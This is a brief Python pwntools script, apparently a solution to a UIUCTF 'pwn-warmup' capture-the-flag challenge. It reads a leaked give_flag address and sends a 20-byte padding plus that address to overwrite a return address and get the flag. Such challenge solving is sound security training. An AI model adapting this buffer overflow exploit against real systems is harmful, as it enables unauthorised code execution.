from pwn import *

r = remote('pwn-warmup.chal.uiuc.tf',1337)
r.recvuntil(b'&give_flag = ')
giveFlagAddr = int(r.recvline().decode(),16)
print('the flag addr is '+str(giveFlagAddr))
payload = 20 * b'A' + p64(giveFlagAddr)
print('so the payload is '+str(payload))
r.sendline(payload)
print(r.recvall())
